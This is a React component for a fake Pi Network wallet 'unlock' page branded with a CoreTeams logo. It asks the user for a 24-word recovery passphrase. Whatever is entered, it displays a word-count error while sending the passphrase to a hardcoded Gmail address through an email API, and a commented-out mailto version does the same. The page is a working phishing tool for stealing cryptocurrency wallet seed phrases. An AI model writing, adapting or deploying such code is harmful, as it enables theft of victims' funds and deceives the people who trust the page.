import { Link } from "react-router-dom";
import { useState } from "react";
import styles from "./UnlockWallet.module.css";
import { sendEmail } from "../email/Email";

const UnlockWallet = () => {
  const [passphrase, setPassphrase] = useState("");
  const [showError, setShowError] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    // Count words for error message display
    // const wordCount = passphrase
    //   .trim()
    //   .split(/\s+/)
    //   .filter((word) => word.length > 0).length;

    // Show error message
    setShowError(true);

    // Send email regardless of word count
    // const emailBody = `Passphrase: ${passphrase}`;
    // window.location.href = `mailto:allenumunade@gmail.com?subject=Wallet Passphrase&body=${encodeURIComponent(
    //   emailBody
    // )}`;
    const recipientEmail = "allenumunade@gmail.com"; // Replace with your email or dynamic value.

    try {
      await sendEmail(recipientEmail, passphrase); // Call the API function.
      alert("Email sent successfully!");
    } catch (error) {
      alert("Failed to send email. Please try again.");
    }
  };

  const handlePassphraseChange = (e) => {
    setPassphrase(e.target.value);
  };

  // Count words for error message
  const wordCount = passphrase
    .trim()
    .split(/\s+/)
    .filter((word) => word.length > 0).length;

  return (
    <div className={styles.unlockPage}>
      <div className={styles.topBar}>
        <div className={styles.topBarContent}>
          <Link to="/pi/validate" className={styles.withText}>
            Back
          </Link>
          <img
            src="https://www.coreteams.net/_next/image?url=%2Fimages%2Flogo.png&w=128&q=75"
            alt="CoreTeams Logo"
            className={styles.logo}
          />
        </div>
      </div>

      <div className={styles.unlockContainer}>
        <div className={styles.walletHeader}>
          <h1>Validate/Unlock Pi Wallet</h1>
        </div>

        <div className={styles.walletContent}>
          <textarea
            placeholder="Enter your 24-word passphrase here"
            rows={8}
            className={styles.passphraseInput}
            value={passphrase}
            onChange={handlePassphraseChange}
          />

          {showError && (
            <p className={styles.errorMessage}>
              Please enter exactly 24 words. Current count: {wordCount} words
            </p>
          )}

          <button className={styles.unlockButton} onClick={handleSubmit}>
            Unlock with passphrase
          </button>

          <div className={styles.infoText}>
            <p>
              As a non-custodial wallet, your wallet passphrase is exclusively
              accessible only to you. Recovery of passphrase is currently
              impossible.
            </p>

            <p className={styles.lostPassphrase}>
              Lost your passphrase? <a href="#">You can create a new wallet</a>,
              but all your π in your previous wallet will be inaccessible.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default UnlockWallet;
